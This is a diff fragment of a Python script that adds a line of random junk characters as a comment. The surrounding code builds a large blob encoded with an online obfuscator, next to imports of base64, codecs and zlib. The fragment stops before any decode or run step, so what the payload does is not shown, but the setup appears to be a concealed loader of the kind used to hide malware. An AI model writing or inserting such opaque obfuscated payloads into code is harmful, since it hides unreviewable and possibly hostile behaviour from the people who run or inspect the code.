@@ -1,4 +1,5 @@
 #pip install pycryptodome  , It works only v3.11 Above.
+#hweasdasd2342423534534534tertfgdfg
 import random ,base64,codecs,zlib;pyobfuscate=""
 
 obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(hexlify)'],['''@dG7p81AP)SU$~O3Y!Z~8=6i?L^90%MnLIu>#AjlgRd1eplrqdh@|9NaPoyE^;em&0cBw#clEwL@G@#Oa%DZS!wVstEUeKewIV(>bp^9FSZNOJ-@~GxAa@86ox@w{2*@ZiWnQ?*352FnCf>v0D;lw0PwnXqP97;wgM}AzzOYOlh#-=!O~{QKA|tTSm0o?(!%B(?(p|8)@^l<kyW&_}ZyYzk{OP}FNFyq|RIRPEDh(MnaTfjW7zd@$G@%kOHjtB2B%uxl-$H>%hHq6}iFV}&UyNd-$PHF+RixA3NQveSw+O%cOj8iN6vGueFQu_wJqUVgi5DBftH4rjb}mzeECg>fCsiusUJfs~=QY4{Nu8%61Qe6ZpQdaLChKvFwea6W_sjJ^DQvymGoCz4I*iacJ?@iJySLR5JJPV_gV_9jJlEiq7%O(^_F-Tr1vVaRyz}<cdt(CueiDf*2uzA^odk(dD2`L>As1U~eUHrB2nJCGn!lmEm96d-DkUx;vc9+`lx?D-eN%NbqsxJr{tzOLMgRzpp6A*tSQCl!ap~ByxAj1{_=G{~4_5stKQ7jR{!>~WOjt)Qs_94zRPtRq9kF^t;_9f&Ua`g#ZKo_^_9~~Ljt_0h@*10tn~H@arW35g37sBi03oXT0*IL#cCAFDM)ffBfSRW<dM+_wh%|y)G+I#RN}KM^c?1oe_JdDQB+L9f9@7izdjsg$8%GDWhn|2t#sFC^sx<$T`o9x+1~EWH^6p(=me%3Lo~Gb*;s'''.replace('\n','')]))
